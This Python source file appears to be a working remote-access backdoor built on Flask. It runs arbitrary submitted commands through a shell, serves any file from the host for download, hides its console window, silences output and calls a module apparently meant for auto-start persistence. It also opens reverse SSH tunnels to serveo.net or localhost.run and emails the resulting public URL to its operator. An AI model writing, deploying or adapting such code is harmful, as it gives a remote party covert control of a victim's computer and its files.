import subprocess
import auto_running
from flask import Flask, render_template, request, send_file
import os
import threading
import mail_sender
import sys
from markupsafe import escape


app = Flask(__name__)

def home_code(response_message="", current_directory=""):
    return f"""
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Command Input</title>
</head>
<body>
    <pre>{ current_directory }</pre>
    <h1>Enter a command</h1>

    <form method="POST" action="/">
        <input type="text" name="command" placeholder="Type your command here">
        <input type="submit" value="Submit">
    </form>

    <form method="POST" action="/download">
        <input type="text" name="filename" placeholder="Enter file name to download">
        <input type="submit" value="Download">
    </form>

    <pre>{response_message}</pre>
</body>
</html>
    """
@app.route('/', methods=['GET', 'POST'])
def home():
    response = ""

    if request.method == 'POST':
        response =  post_method()
    directory = os.getcwd()
    response = escape(response)

    return home_code(response_message=response, current_directory=f"your current directory: {directory}")



def post_method():
    command = request.form.get('command')

    response = run_command(command)
    response = special_command(command, response)
    return response

def run_command(command):
    try:
        response = subprocess.run(command, shell=True, capture_output=True, text=True, creationflags=CREATE_NO_WINDOW).stdout
    except:
        response = "ERROR"
    return response

def special_command(command, response):
    if command[0:2] == "cd":
        response = cd(command)

    elif command[0:2] == "cd ..":
        os.chdir("..")
        response = "changed directory to " + os.getcwd()

    return response

def cd(command):
    try:
        change_directory = command[3:]
        if "C\\" not in change_directory:
            change_directory = os.getcwd() + "\\" + change_directory
        os.chdir(change_directory)
        return "changed directory to " + os.getcwd()
    except:
        return f"{command[3:]} is not a directory"

@app.route("/download", methods=['POST'])
def download():
    try:
        filename = request.form.get('filename')
        filename = file_manager(filename)
        if filename:
            return send_file(filename, as_attachment=True)
        else:
            return "file not found", 404
    except Exception as e:
        return f"Eroor:\n{e}", 404

def file_manager(filename):
    if "C:\\" not in filename:
        filename = os.getcwd() + "\\" + filename
    if not os.path.isfile(filename):
        filename = None
    return filename

CREATE_NO_WINDOW = 0x08000000

def serveo(mail):
    check = True
    response = subprocess.Popen(
        ["ssh", "-R", "80:127.0.0.1:5000", "serveo.net"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=CREATE_NO_WINDOW)
    count = 0
    for line in response.stdout:
        if "http" in line and check:
            check = False
            url = line.split(" ")[-1]
            mail.send(url)
            return True
        if count >= 2:
            response.terminate()
    return False

def local_run(mail):
    check = True
    response = subprocess.Popen(
        ["ssh", "-R", "80:127.0.0.1:5000", "nokey@localhost.run"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=CREATE_NO_WINDOW)
    count = 0
    for line in response.stdout:
        if "http" in line and ".life" in line:
            check = False
            url = line.split(" ")[-1]
            mail.send(url, server="localhost.run")
            return True

        if count >= 23:
            response.terminate()
            mail.send(available=False)
        count += 1
    return False

def run_tunnel(mail):
    response = serveo(mail)
    if not response:
        local_run(mail)

def mute_stdout():
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')

def main():
    mute_stdout()
    auto_running.auto_run()
    mail = mail_sender.MailSender()
    threading.Thread(target=run_tunnel, args=(mail,)).start()
    app.run(debug=False)

if __name__ == '__main__':
    main()
